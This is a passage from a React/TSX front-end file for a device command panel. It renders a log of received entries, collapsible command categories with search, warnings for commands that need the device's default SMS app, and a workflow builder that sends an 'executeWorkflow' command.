                            Failed
                          </Badge>
                        )}
                        {entry.status === 'pending' && (
                          <Badge variant="secondary">
                            <Loader className="h-3 w-3 mr-1 animate-spin" />
                            Pending
                          </Badge>
                        )}
                      </div>
                      <div className="text-xs text-muted-foreground mb-1">
                        {new Date(entry.receivedAt).toLocaleString('en-US')}
                      </div>
                      <div className="text-xs font-mono bg-muted p-1 rounded break-all">
                        {entry.value}
                      </div>
                      {entry.error && (
                        <div className="text-xs text-red-600 dark:text-red-400 mt-1">
                          Error: {entry.error}
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
          )}

          {/* Commands by Category */}
          <div className="space-y-4">
        {Object.keys(filteredCommandsByCategory).length === 0 ? (
          <Card>
            <CardContent className="py-8 text-center text-muted-foreground">
              No commands found matching &quot;{searchQuery}&quot;
            </CardContent>
          </Card>
        ) : (
          Object.entries(filteredCommandsByCategory).map(([category, commandKeys]) => {
          const isExpanded = expandedCategories[category] ?? false
          return (
            <Card key={category}>
              <CardHeader
                className="cursor-pointer hover:bg-muted/50"
                onClick={() => toggleCategory(category)}
              >
                <div className="flex items-center justify-between">
                  <CardTitle className="text-lg">{category}</CardTitle>
                  <div className="flex items-center gap-2">
                    <Badge variant="outline">{commandKeys.length} commands</Badge>
                    {isExpanded ? (
                      <ChevronUp className="h-4 w-4" />
                    ) : (
                      <ChevronDown className="h-4 w-4" />
                    )}
                  </div>
                </div>
              </CardHeader>
              {isExpanded && (
                <CardContent className="pt-0">
                  <div className="space-y-2">
                    {commandKeys.map(commandKey => {
                      const config = ALL_COMMANDS[commandKey]
                      if (!config) return null

                      // Check if command requires default SMS app
                      const requiresDefaultSmsApp = commandsRequiringDefaultSmsApp.includes(commandKey)
                      const showWarning = requiresDefaultSmsApp && defaultSmsAppStatus === false

                      return (
                        <div key={commandKey} className="relative">
                          {showWarning && (
                            <div className="absolute -top-2 -right-2 z-10">
                              <div className="rounded-md bg-yellow-100 dark:bg-yellow-900/30 border border-yellow-300 dark:border-yellow-700 px-2 py-1 flex items-center gap-1">
                                <AlertCircle className="h-3 w-3 text-yellow-600 dark:text-yellow-400" />
                                <span className="text-xs text-yellow-700 dark:text-yellow-300 font-medium">
                                  Requires Default SMS App
                                </span>
                              </div>
                            </div>
                          )}
                          <CommandRow
                            commandKey={commandKey}
                            config={config}
                            params={commandParams[commandKey] || {}}
                            loading={loadingCommands[commandKey] || false}
                            onParamChange={handleParamChange}
                            onSend={sendCommand}
                          />
                        </div>
                      )
                    })}
                  </div>
                </CardContent>
              )}
            </Card>
          )
        })
        )}
          </div>
        </TabsContent>

        <TabsContent value="workflows" className="mt-4">
          <WorkflowBuilder
            deviceId={deviceId}
            allCommands={ALL_COMMANDS}
            onExecute={(workflowJson) => {
              // Execute workflow by sending executeWorkflow command
              if (deviceId) {
                sendCommand('executeWorkflow', { workflowJson })
              }
            }}
          />
        </TabsContent>
      </Tabs>
    </div>
  )
}
